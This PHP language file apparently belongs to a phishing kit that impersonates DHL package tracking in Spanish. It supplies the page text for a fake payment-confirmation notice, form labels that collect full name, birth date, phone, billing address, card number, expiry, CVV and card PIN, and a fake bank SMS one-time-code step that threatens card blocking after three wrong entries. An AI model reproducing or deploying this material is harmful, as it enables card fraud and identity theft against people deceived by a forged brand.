<?php

function lang($phrase){
	static $lang = array(

			'Title_page' => '| Bienvenido | ',
			'Min_i1' => 'Alertas (1)',
			'Min_i2' => 'Global',
			'Min_i3' => 'Buscar',


			'Ming_i1' => 'Rastrear',
			'Ming_i2' => 'Enviar',
			'Ming_i3' => 'Soluciones logísticas',
			'Ming_i4' => 'Servicio al cliente',




			'Text_i1' => 'SEGUIMIENTO DHL.',
			'Text_i2' => 'Aquí encontrará información sobre sus envíos',
			'Text_i3' => 'Rastree sus envíos de paquetes en cualquier momento desde el envío hasta la entrega',

			'Text_b1' => '¡Mensaje importante!',
			'Text_b2' => 'Para completar la entrega lo antes posible, confirme el pago',
			'Text_b3' => 'haciendo clic en Siguiente. La confirmación en línea debe hacerse dentro de los próximos 14 días, antes de que caduque. ',

			'Input_i1' => 'Nombre completo',
			'Input_i2' => 'Fecha de nacimiento',
			'Input_i3' => 'Número de teléfono',
			'Input_i4' => 'Dirección de facturación',
			'Input_i5' => 'Código postal',


'Input_cc1' => 'Nombre en la tarjeta',
'Input_cc2' => 'Número de tarjeta',
'Input_cc3' => 'Fecha de caducidad MM / AA',
'Input_cc4' => 'Código de seguridad CVV (CVC)',
'Input_cc5' => 'Pin tarjeta',


			'Btn_n1' => 'Siguiente',

			'Footer_title1' => 'PUBLICAR GRUPO DHL',
			'Footer_title2' => 'SÍGUENOS',
			'Footer_text1' => 'Conocimiento de fraude',
			'Footer_text2' => 'Avisos legales',
			'Footer_text3' => 'Términos de uso',
			'Footer_text4' => 'Aviso de privacidad',
			'Footer_text5' => 'Resolución de disputas',
			'Footer_text6' => 'Accesibilidad',
			'Footer_text7' => 'Configuración de cookies',
			'Footer_text8' => 'Acerca de',
			'Footer_rights' => '2020 © DHL International GmbH. Todos los derechos reservados.',


            'text_succ' => 'Ha activado correctamente su proceso de envío. Recibirá un correo electrónico de nosotros cuando le enviemos su paquete',
			'Sms_text1' => 'Confirme el siguiente pago',
			'Sms_text2' => 'La contraseña única se ha enviado al número de teléfono móvil que se detalla a continuación. Si necesita cambiar su número de teléfono móvil, comuníquese con su banco o modifíquelo a través de los canales disponibles (ATM, web) ',
			'Sms_text3' => 'Comerciante:',
			'Sms_text4' => 'Cantidad:',
			'Sms_text5' => 'Fecha:',
			'Sms_text6' => 'Código SMS:',
			'Sms_text7' => 'Ingrese el código de verificación recibido por sms:',
			'Sms_error1' => '¡El SMS está mal o ha caducado! Después de (3) errores al ingresar el código recibido por SMS, se cancela la transacción actual y se bloquea la tarjeta de crédito.'
		
	);	
	return $lang[$phrase];
}




//		 | ' | = &apos;




 ?>
 
 
 
